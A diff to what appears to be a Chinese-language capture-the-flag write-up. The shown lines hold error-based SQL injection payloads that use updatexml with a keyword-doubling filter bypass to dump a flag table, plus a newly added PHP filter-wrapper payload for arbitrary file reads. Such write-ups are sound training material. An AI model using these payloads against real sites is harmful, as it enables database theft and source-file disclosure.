@@ -1,4 +1,4 @@
-[[TOC]]
+
 
 # 0x01 [信息搜集]
 ## 常见的搜集
@@ -96,6 +96,14 @@ name=test' and (updatexml('anything',concat('~',(selselectect group_concat(table
 --爆值
 name=test' and (updatexml('anything',concat('~',(selselectect flag from fl4g)),'anything'))# &pass=1 
   ```
-
 ![](pic/sql2_2.png)
 ![](pic/sql2_3.png)
+
+# 0x03 [任意文件读取]
+## afr_1
+利用php伪协议,通过filter或文件（源码）的BASE64 输出，再解码：
+```
+?p=php://filter/convert.base64-encode/resource=flag
+```
+![](pic/afr1_1.png)
+![](pic/afr1_2.png)
